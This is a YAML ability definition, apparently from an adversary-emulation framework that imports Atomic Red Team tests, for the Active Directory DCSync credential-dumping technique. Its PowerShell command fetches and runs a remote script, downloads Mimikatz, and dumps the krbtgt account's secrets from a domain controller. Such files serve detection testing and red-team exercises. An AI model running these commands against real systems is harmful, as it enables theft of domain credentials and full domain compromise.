- id: 129efd28-8497-4c87-a1b0-73b9a870ca3e
  name: DCSync (Active Directory)
  description: 'Active Directory attack allowing retrieval of account information
    without accessing memory or retrieving the NTDS database.

    Works against a remote Windows Domain Controller using the replication protocol.

    Privileges required: domain admin or domain controller account (by default), or
    any other account with required rights.

    [Reference](https://adsecurity.org/?p=1729)'
  tactic: credential-access
  technique:
    attack_id: T1003.006
    name: 'OS Credential Dumping: DCSync'
  platforms:
    windows:
      sh:
        command: '$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe; if
          (Test-Path $mimikatz_path) {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
          = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"
          -UseBasicParsing); $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases";
          $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
          | where-object { $_.endswith(".zip") }; $mimikatz_exe = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe;
          $basePath = Split-Path $mimikatz_exe | Split-Path; Invoke-FetchFromZip $zipUrl
          "x64/mimikatz.exe" $basePath; fi; %tmp%\mimikatz\x64\mimikatz.exe "lsadump::dcsync
          /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%" "exit"'
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - t1003.006
  - credential-access
  author: Atomic Red Team
  additional_info:
    input_arguments:
      domain:
        description: Targeted Active Directory domain
        type: string
        default: '%userdnsdomain%'
      user:
        description: Targeted user
        type: string
        default: krbtgt
      mimikatz_path:
        description: Mimikatz windows executable
        type: path
        default: '%tmp%\mimikatz\x64\mimikatz.exe'
    dependencies:
    - description: 'Mimikatz executor must exist on disk and at specified location
        (#{mimikatz_path})

        '
      prereq_command: '$mimikatz_path = cmd /c echo #{mimikatz_path}

        if (Test-Path $mimikatz_path) {exit 0} else {exit 1}

        '
      get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n\
        IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"\
        \ -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\
        \n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url\
        \ | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n\
        $basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl\
        \ \"x64/mimikatz.exe\" $basePath\n"
    technique_created: '2020-02-11T18:45:34.293Z'
    atomic_guid: 129efd28-8497-4c87-a1b0-73b9a870ca3e
    import_timestamp: '2025-09-26T03:00:59.098404Z'
